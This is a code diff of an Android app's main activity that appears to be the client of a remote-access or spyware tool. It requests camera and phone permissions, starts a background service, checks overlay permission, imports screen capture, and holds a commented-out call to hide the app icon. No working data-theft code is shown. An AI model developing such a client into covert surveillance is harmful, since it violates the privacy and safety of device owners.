@@ -1,29 +1,24 @@
 package com.ot.grhq.client;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 
 import android.Manifest;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
+import android.content.ServiceConnection;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.media.projection.MediaProjectionManager;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Environment;
+import android.os.IBinder;
+import android.provider.Settings;
 import android.util.Log;
-import android.widget.Toast;
 
-import com.ot.grhq.client.functionality.FileManager;
-import com.ot.grhq.client.functionality.Location;
-import com.ot.grhq.client.functionality.Phone;
-import com.ot.grhq.client.functionality.SMS;
-import com.ot.grhq.client.functionality.Screenshot;
 import com.ot.grhq.client.functionality.Utils;
 
 import org.json.JSONException;
@@ -31,24 +26,18 @@ import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
-import java.io.DataOutputStream;
-import java.io.File;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
-import java.net.URI;
-import java.net.URISyntaxException;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Map;
 
 public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 200;
+
     private static String[] PERMISSIONS = {
         Manifest.permission.CAMERA,
         Manifest.permission.CALL_PHONE,
@@ -77,8 +66,8 @@ public class MainActivity extends AppCompatActivity {
                 setClientID();
             } catch (JSONException e) {}
         }
-
-//        hideApplicationIcon();
+//
+////        hideApplicationIcon();
         startService(new Intent(this, MainService.class));
     }
 
@@ -107,6 +96,14 @@ public class MainActivity extends AppCompatActivity {
 
         if (!permissionsToRequest.isEmpty() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
             requestPermissions(permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+
+    }
+
+    public static boolean hasOverlayPermission(Context context) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            return Settings.canDrawOverlays(context);
+        }
+        return true; // For versions below Marshmallow, overlay permission is not required
     }
 
     /**
